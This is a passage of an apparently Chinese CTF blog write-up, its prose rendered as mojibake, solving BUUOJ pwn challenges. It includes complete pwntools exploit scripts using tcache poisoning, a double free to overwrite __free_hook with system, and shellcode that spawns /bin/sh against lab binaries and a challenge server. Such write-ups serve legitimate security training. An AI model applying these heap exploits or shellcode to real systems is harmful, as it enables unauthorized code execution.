class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;Content: &#x27;)</span></span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">payload = p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04æ€»ç»“"><a href="#0x04æ€»ç»“" class="headerlink" title="0x04æ€»ç»“"></a>0x04æ€»ç»“</h4><h5 id="1-callocåˆ†é…å †å—æœºåˆ¶"><a href="#1-callocåˆ†é…å †å—æœºåˆ¶" class="headerlink" title="1.callocåˆ†é…å †å—æœºåˆ¶"></a>1.callocåˆ†é…å †å—æœºåˆ¶</h5><p>callocåˆ†é…å †å—<strong>æ˜¯ä¸ä¼šä»tacheé‡Œé¢è·å–å †å—çš„ï¼Œåœ¨callocçš„æ—¶å€™ä¼šä»fastbiné‡Œé¢æ‹¿å †å—ï¼Œå¹¶ä¸”å½“å®ƒå»å–å †å—çš„æ—¶å€™ä¼šæŠŠfastbinå‰©ä½™çš„å †å—æ”¾åˆ°tacheé‡Œé¢</strong></p><p>å®éªŒä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line">    <span class="comment">//fastbin</span></span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/24.png" class=""><p>åœ¨tache bin attackä¸­ä¹Ÿå®éªŒè¿‡äº†ï¼Œmallocåªæœ‰å½“tacheä¸­çš„binåˆ†é…å®Œäº†ä¹‹åæ‰ä¼šæŠŠfastbiné‡Œé¢çš„å †å—æ‹¿åˆ°tacheé‡Œé¢ï¼Œcallocä¸ä¸€æ ·å•Šï¼ï¼ï¼</p><p>æ˜ç™½äº†è¿™ä¸€ç‚¹å°±å¾ˆç®€å•äº†ç›´æ¥<strong>tcache poisoning</strong>æ”¹åˆ°ptr-0x10çš„ä½ç½®ï¼Œä¹‹åè§¦å‘åé—¨å‡½æ•°å°±å¯ä»¥getshelläº†ï¼</p><h3 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯-4"><a href="#0x00-åŸºæœ¬ä¿¡æ¯-4" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/25.png" class=""><p>ä¿æŠ¤å…¨å¼€ä¸è¯´ï¼Œè¿˜å¤šäº†ä¸€ä¸ªFORTIFYï¼Œè¿™æ˜¯ä¸ªå•¥ï¼Ÿ</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/26.png" class=""><p>å°±æ˜¯è¯´å®šä¹‰æ­¤å®ä¼šå¯¼è‡´æ‰§è¡Œä¸€äº›è½»é‡çº§æ£€æŸ¥ï¼Œä»¥åœ¨ä½¿ç”¨å„ç§å­—ç¬¦ä¸²å’Œå†…å­˜æ“ä½œå‡½æ•°ï¼ˆä¾‹å¦‚<code>memcpy</code>ï¼Œ<code>memset</code>ã€<code>stpcpy</code>ã€<code>strcpy</code>ã€<code>strncpy</code>ã€<code>strcat</code>ã€<code>strncat</code>ã€<code>sprintf</code>ã€<code>snprintf</code>ã€<code>vsprintf</code>ã€ <code>vsnprintf</code>ã€<code>gets</code>ã€ åŠå…¶å®½å­—ç¬¦å˜ä½“ï¼‰æ—¶æ£€æµ‹ä¸€äº›ç¼“å†²åŒºæº¢å‡ºé”™è¯¯</p><p>æ¯”å¦‚printfå°±å˜æˆäº†printf_chkï¼Œå®ƒå°†å¯ä»¥æ£€æŸ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå°±åƒä¸‹é¢è¿™æ ·</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/27.png" class=""><h4 id="0x01-IDAåˆ†æ-4"><a href="#0x01-IDAåˆ†æ-4" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/28.jpg" class=""><p>åœ¨åˆå§‹åŒ–çš„æ—¶å€™æœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥æ³„éœ²libcï¼Œä¸€å¼€å§‹å°±ç„äº†ä¸€ä¸‹æ²¡å¤ªåœ¨æ„ï¼Œåé¢å‘ç°libcæ³„éœ²ä¸äº†æ²¡æ³•å†™ï¼Œçœ‹åˆ°wpæ‰çŸ¥é“ï¼Œå†™å †é¢˜è¿˜æ˜¯è¦çœ‹çœ‹å…¶ä»–çš„è¾“å…¥ç‚¹ï¼Œæ¯ä¸ªè¾“å…¥ç‚¹éƒ½æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªæ¼æ´ç‚¹ï¼</p><p>putså‡½æ•°çš„è¾“å‡ºæ˜¯ç›´åˆ°ç¢°åˆ°â€\x00â€æ‰ä¼šç»“æŸï¼Œsæ˜¯ä¸€ä¸ªå¤§å°ä¸º16çš„æ•°ç»„ï¼Œå®ƒåªè®©æˆ‘ä»¬è¾“å…¥å‰å…«ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠå‰å…«ç»™å†™æ»¡å¦‚æœåé¢æ²¡æœ‰â€\x00â€å°±ä¼šæŠŠåå…«çš„å­—ç¬¦ç»™å¸¦å‡ºæ¥ï¼Œåé¢ç¢°å·§æ˜¯libcé‡Œé¢çš„åœ°å€</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/29.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/35.jpg" class=""><p>è™½ç„¶%3$pä¼šæŠ¥é”™ï¼Œä½†æ˜¯%pä¸ä¼šæŠ¥é”™è°ƒè¯•ä¸€ä¸‹ï¼Œå…¨æ˜¯æ ˆä¸Šçš„åœ°å€ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªå°±è¡Œ</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/33.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/34.jpg" class=""><p>ä¸‹é¢å°±æ˜¯æ­£å¸¸çš„å †ï¼Œshowå’Œeditå‡½æ•°åºŸäº†</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/30.png" class=""><p>æ¼æ´ç‚¹å°±æ˜¯åœ¨delé‡Œé¢ï¼Œæœ‰ä¸ªuaf</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/31.png" class=""><h4 id="0x02è§£é¢˜æ€è·¯-1"><a href="#0x02è§£é¢˜æ€è·¯-1" class="headerlink" title="0x02è§£é¢˜æ€è·¯"></a>0x02è§£é¢˜æ€è·¯</h4><ol><li>é€šè¿‡å‰é¢çš„æº¢å‡ºï¼Œæ³„éœ²å‡ºlibc</li><li>double freeæ§åˆ¶å †å—ä¿®æ”¹fdæŒ‡é’ˆæŒ‡å‘free_hook</li><li>ä¿®æ”¹free_hookä¸ºsystem</li></ol><h4 id="0x03-å®Œæ•´EXP-4"><a href="#0x03-å®Œæ•´EXP-4" class="headerlink" title="0x03 å®Œæ•´EXP"></a>0x03 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_en_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;ciscn_2019_en_3&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25784&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the size of story: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;please inpute the story: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ID.\n&#x27;</span>,<span class="string">&#x27;zyen1111&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]-<span class="number">231</span></span><br><span class="line">io.success(<span class="string">&quot;[*]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.success(<span class="string">&quot;[*]system_addr =&gt; &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">io.success(<span class="string">&quot;[*]free_hook =&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04æ€»ç»“-1"><a href="#0x04æ€»ç»“-1" class="headerlink" title="0x04æ€»ç»“"></a>0x04æ€»ç»“</h4><h5 id="1-putså°å®éªŒ"><a href="#1-putså°å®éªŒ" class="headerlink" title="1.putså°å®éªŒ"></a>1.putså°å®éªŒ</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">16</span>];</span><br><span class="line">read(<span class="number">0</span>,s,<span class="number">16</span>);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯readäº†8ä¸ªå­—ç¬¦ï¼Œè¿™æ¬¡æˆ‘ä»¬readäº†16ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æˆ‘ä»¬çš„è¾“å…¥åªè¾“å…¥äº†8ä¸ª1ï¼ŒåŒæ ·çš„ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†å®ƒæœ‰æ³„éœ²ä¸‹é¢çš„åœ°å€ï¼Œputså‡½æ•°è¿˜æ˜¯æŒºå±é™©çš„ï¼</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/37.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/36.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/38.png" class=""><p>æœ€åå•°å—¦ä¸€ä¸‹ï¼Œæ­¤double freeå·²ç»ä¸é€‚åº”ç”¨äºlibc-2.27äº†ï¼Œlibc-2.26ä¸çŸ¥é“ï¼Œdouble freeçš„è¡¥ä¸å·²ç»æ‰“åˆ°libc-2.27ä¸Šäº†ï¼Œæå¾—æˆ‘æœ¬åœ°è°ƒè¯•ä¸äº†â€¦ï¼ˆæ‡’çš„æ¢libc</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/32.jpg" class=""><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">libcè¡¥ä¸</a></p><p>åŠ äº†ä¸ªkeyï¼Œè®°å¾—å¯ä»¥æ”¹è¿™ä¸ªkeyç»•è¿‡è¿™ä¸ªæ£€æŸ¥çš„ï¼Œä½†æ˜¯è¿™é¢˜æ²¡æœ‰editå‡½æ•°â€¦.</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/39.jpg" class=""><h3 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯-5"><a href="#0x00-åŸºæœ¬ä¿¡æ¯-5" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/51.png" class=""><h4 id="0x01-IDAåˆ†æ-5"><a href="#0x01-IDAåˆ†æ-5" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/40.png" class=""><p>ç¨‹åºçš„æµç¨‹å¾ˆç®€å•å°±æ˜¯è¾“å…¥shllcodeï¼Œç„¶åæ‰§è¡Œï¼Œä½†æ˜¯sub_400786é‡Œé¢è¿˜æœ‰åå ‚</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/41.png" class=""><p>å®ƒä¼šå¯¹æ¯”ä¸€æ®µå­—ç¬¦ä¸²ï¼Œå¦‚æœåŒ¹é…å°±èƒ½æ‰§è¡Œæˆ‘ä»¬çš„shellcodeï¼Œâ€\x00â€å°±èƒ½ç»•è¿‡ï¼Œé—®é¢˜ä¸å¤§</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/42.png" class=""><p>ä½†å½“æˆ‘æŠŠshellcodeæ‰“è¿›å»çš„æ—¶å€™ï¼Œå¾ˆæƒŠå¥‡çš„å‘ç°å±…ç„¶æ²¡getshellï¼ŒåŠ¨è°ƒå‘ç°å®ƒå±…ç„¶æŠŠshellcodeçš„push 42ç»™å äº†</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/43.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/44.png" class=""><p>å¯èƒ½æŸä¸ªåœ°æ–¹è¦†ç›–äº†å§ä¹Ÿä¸å¤ªæ¸…æ¥šï¼Œåœ¨shellcodeå‰é¢åŠ ä¸Šå‡ ä¸ªâ€\x6aâ€å°±å¯ä»¥äº†</p><h4 id="0x02-å®Œæ•´EXP"><a href="#0x02-å®Œæ•´EXP" class="headerlink" title="0x02 å®Œæ•´EXP"></a>0x02 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;starctf_2019_babyshell&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26094&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># check = &#x27;\x5A\x5A\x4A\x20\x6C\x6F\x76\x65\x73\x20\x73\x68\x65\x6C\x6C\x5F\x63\x6F\x64\x65\x2C\x61\x6E\x64\x20\x68\x65\x72\x65\x20\x69\x73\x20\x61\x20\x67\x69\x66\x74\x3A\x05\x20\x65\x6E\x6A\x6F\x79\x20\x69\x74\x21\x0A\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;\x6a\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;give me shellcode, plz:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;\x00\x6a&#x27;</span>+shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(10)</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h4><p>å“‡ï¼å“­äº†ï¼Œå­¦åˆ°äº†ï¼Œç›´æ¥ç¼–å†™shellcodeè°ƒç”¨sys_read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4008CB&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;syscall&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27; plz:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xC</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend"><a href="#bjdctf-2020-YDSneedGrirlfriend" class="headerlink" title="bjdctf_2020_YDSneedGrirlfriend"></a>bjdctf_2020_YDSneedGrirlfriend</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯-6"><a href="#0x00-åŸºæœ¬ä¿¡æ¯-6" class="headerlink" title="0x00 